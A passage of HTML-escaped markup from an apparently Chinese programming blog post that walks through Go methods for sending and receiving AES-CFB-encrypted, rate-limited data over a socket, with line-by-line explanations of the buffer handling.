class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		alSend += length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;上面的代码中，&lt;code&gt;chRate&lt;/code&gt; 是一个只读的 channel，它来自内置的 &lt;code&gt;time&lt;/code&gt; 库，可用于控制发送速度。如果发送方发送频率大于接收方接收频率，则可能出现阻塞和数据丢失，因此必须限制发送方的 &lt;code&gt;chRate&lt;/code&gt; 速度慢于接收方的接收速率。&lt;code&gt;alSend&lt;/code&gt; 表示已经发送的数据长度。经验表明，使用 AES CFB 加密时，密文长度通常不会超过明文长度的两倍，为了保险，我们设置密文长度上限为缓冲区长度，因此每个消息可携带的明文长度至多为缓冲区长度的 1/3。代码的第 18 行用于判断接下来要发送的消息需要携带的明文长度，如果剩余要发送的数据长度大于 1/3 个缓冲区长度，则发送 1/3 个缓冲区长度的明文，否则只发送剩余的明文。23 ~ 27 行构造发送的消息，消息格式和此前设计的 &lt;strong&gt;格式1&lt;/strong&gt; 相同。函数返回的 bool 值表明发送是否成功。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RecvBytes()([]byte, error)&lt;/code&gt;的接收过程如下：首先从 socket 读取 8 个字节，按大端序转为 int64 类型，得到要接收数据的总长度。之后严格按照 &lt;strong&gt;格式1&lt;/strong&gt; 接收消息，每次先接收 16 字节，根据前 8 字节获得即将接收的消息携带的明文长度，根据后 8 字节获得整个消息的长度。当接收到的数据长度达到总长度时，将停止接收并以字节流返回本次调用接收到的所有数据。代码如下，其中第 7 行用到的 &lt;code&gt;RecvUntil(until int64, init int64, chRate &amp;lt;-chan time.Time)(int64, err)&lt;/code&gt; 方法的作用是，当前缓冲区已有长度为 &lt;code&gt;init&lt;/code&gt; 的数据，该方法将以 &lt;code&gt;chRate&lt;/code&gt; 指定的速率一直从 socket 读取，直到缓冲区长度达到了 &lt;code&gt;until&lt;/code&gt;，并返回现在缓冲区持有的数据长度。如果在方法调用期间出现异常，返回值将携带错误消息。该方法的代码将在介绍完 &lt;code&gt;RecvBytes()&lt;/code&gt; 后立刻给出，你可以先拖到下面查看该方法具体实现。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; (t *transmitter) RecvBytes() ([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; err error&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; t.buf == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || t.conn == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	chRate := time.Tick(&lt;span class=&quot;number&quot;&gt;1e3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	length, err := t.RecvUntil(&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, t.recvLen, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	totalLength := auth.BytesToInt64(t.buf[:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; toRecvLength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = totalLength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; plength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; elength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; pRecv &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = length - &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt;() &amp;#123; t.recvLen = pRecv &amp;#125;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:length])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	returnBytes := &lt;span class=&quot;built_in&quot;&gt;make&lt;/span&gt;([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, conf.AUTHEN_BUFSIZE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; toRecvLength == &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; returnBytes, &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv, err = t.RecvUntil(&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;), pRecv, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		plength = auth.BytesToInt64(t.buf[:&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		elength = auth.BytesToInt64(t.buf[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv, err = t.RecvUntil(elength, pRecv, chRate)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		receive, err := auth.AesDecode(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;:elength], plength, t.block)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		returnBytes = &lt;span class=&quot;built_in&quot;&gt;append&lt;/span&gt;(returnBytes, receive...)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		toRecvLength -= plength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;copy&lt;/span&gt;(t.buf, t.buf[elength:pRecv])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pRecv -= elength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;上面的代码中，第 12 行获取要接收的数据总长度，并将 &lt;code&gt;toRecvLength&lt;/code&gt; 和 &lt;code&gt;totalLength&lt;/code&gt; 均赋值为该长度。第 16 行将 &lt;code&gt;pRecv&lt;/code&gt; 赋值为当前缓冲区已有数据长度，在方法执行期间，该变量将始终指代缓冲区存在的待处理数据长度，第 17 行指定当方法结束时将 &lt;code&gt;pRecv&lt;/code&gt; 赋值给 transmitter 内私有变量 &lt;code&gt;recvLen&lt;/code&gt;。在每次接收消息前，先判断当前已接收到全部明文（&lt;code&gt;toRecvLength == 0&lt;/code&gt;），之后接收每个消息的前 16 个字节，再接收整个消息。&lt;code&gt;elength&lt;/code&gt; 为当前要接收的消息的总长度（密文长度+16），&lt;code&gt;plength&lt;/code&gt; 为当前要接收消息携带的明文长度。在上面代码的倒数第 3 ~ 4 行，&lt;code&gt;pRecv -= elength&lt;/code&gt; 维护缓冲区待处理数据长度，&lt;code&gt;copy(t.buf, t.buf[elength:pRecv])&lt;/code&gt; 维护缓冲区待处理数据内容。&lt;/li&gt;
&lt;li&gt;方法 &lt;code&gt;RecvUntil(int64, int64, &amp;lt;-chan time.Time) (int64, error)&lt;/code&gt; 的实现如下。这个方法应当被定义为私有的（方法首字母小写），这里因为编写时的失误没有注意，在这里保留这个漏洞，作为警醒。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; (t *transmitter) RecvUntil(until &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;, init &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;, chR &amp;lt;-&lt;span class=&quot;keyword&quot;&gt;chan&lt;/span&gt; time.Time) (&lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;, error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; init &amp;gt;= until &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;lt;-chR&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		length, err := t.conn.Read(t.buf[init:])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; init, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		init += &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; init, &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;SendFromReader-和-RecvToWriter&quot;&gt;&lt;a href=&quot;#SendFromReader-和-RecvToWriter&quot; class=&quot;headerlink&quot; title=&quot;SendFromReader() 和 RecvToWriter()&quot;&gt;&lt;/a&gt;SendFromReader() 和 RecvToWriter()&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这两个方法和上面的 &lt;code&gt;SendBytes()&lt;/code&gt;、&lt;code&gt;RecvBytes()&lt;/code&gt;类似，区别在于读取/接收的对象是 Reader/Writer。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SendFromReader(*bufio.Reader, int64) bool&lt;/code&gt; 方法代码如下，和 &lt;code&gt;SendBytes()&lt;/code&gt; 的主要不同在，每次发送的数据长度由交付 Reader 的缓冲区约束，同时要判断当前读取的 Reader 是否到达 EOF 边界，如果到达则表明发送结束，应当返回 true，否则才返回 false 表明传输出错。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; (t *transmitter) SendFromReader(reader *bufio.Reader, totalLength &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;) &lt;span class=&quot;typename&quot;&gt;bool&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; t.buf == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || t.conn == &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	_, err := t.conn.Write(auth.Int64ToBytes(totalLength))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	sendLength := totalLength&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	chRate := time.Tick(&lt;span class=&quot;number&quot;&gt;2e3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; encodeBufLen &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = t.buflen/&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; - &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; length &lt;span class=&quot;typename&quot;&gt;int&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;lt;-chRate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; sendLength &amp;lt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;constant&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; sendLength &amp;gt;= encodeBufLen &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			length, err = reader.Read(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;+encodeBufLen])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			length, err = reader.Read(t.buf[&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;+sendLength])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span 